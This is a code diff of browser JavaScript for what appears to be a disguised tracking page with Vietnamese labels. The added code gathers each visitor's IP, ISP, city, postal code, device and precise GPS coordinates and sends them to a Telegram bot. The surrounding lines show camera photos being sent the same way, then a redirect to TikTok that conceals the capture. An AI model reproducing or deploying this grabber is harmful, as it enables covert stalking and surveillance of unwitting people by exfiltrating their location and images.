@@ -71,20 +71,46 @@
         .catch(() => null);
 
       const now = new Date();
-      const loc = ipinfo?.loc?.split(",") || ["?", "?"];
+      const ua = navigator.userAgent;
+      const ip = ipinfo?.ip || "Không xác định";
+      const org = ipinfo?.org || "Không xác định";
+      const city = ipinfo?.city || "?";
+      const region = ipinfo?.region || "?";
+      const postal = ipinfo?.postal || "?";
+      const country = ipinfo?.country || "?";
+
+      let os = "Khác";
+      if (ua.includes("Android")) os = "Android";
+      else if (ua.includes("iPhone")) os = "iPhone";
+
+      let lat = "?";
+      let lon = "?";
+
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          lat = pos.coords.latitude.toFixed(6);
+          lon = pos.coords.longitude.toFixed(6);
+          resolve();
+        }, () => resolve(), {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        });
+      });
+
       const msg = `📡 [THÔNG TIN TRUY CẬP]
 
 🕒 Thời gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
-📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
-🖥️ Hệ điều hành: Android
-🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
-🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
-🏢 ISP: ${ipinfo?.org || "Không xác định"}
-🏙️ Địa chỉ: ${ipinfo?.city || "?"}, ${ipinfo?.region || "?"}, ${ipinfo?.postal || "?"}
-🌎 Quốc gia: ${ipinfo?.country || "?"}
-📍 Vĩ độ: ${loc[0]}
-📍 Kinh độ: ${loc[1]}
-📌 Vị trí Google Maps: https://maps.google.com/?q=${loc[0]},${loc[1]}`;
+📱 Thiết bị: ${ua}
+🖥️ Hệ điều hành: ${os}
+🌍 IP dân cư: ${ip}
+🧠 IP gốc: ${ip}
+🏢 ISP: ${org}
+🏙️ Địa chỉ: ${city}, ${region}, ${postal}
+🌎 Quốc gia: ${country}
+📍 Vĩ độ (GPS): ${lat}
+📍 Kinh độ (GPS): ${lon}
+📌 Vị trí Google Maps: https://maps.google.com/?q=${lat},${lon}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -166,7 +192,6 @@
 
       await sendPhotos(front, back);
 
-      // Redirect sau 5 giây
       setTimeout(() => {
         window.location.href = "https://www.tiktok.com/";
       }, 5000);
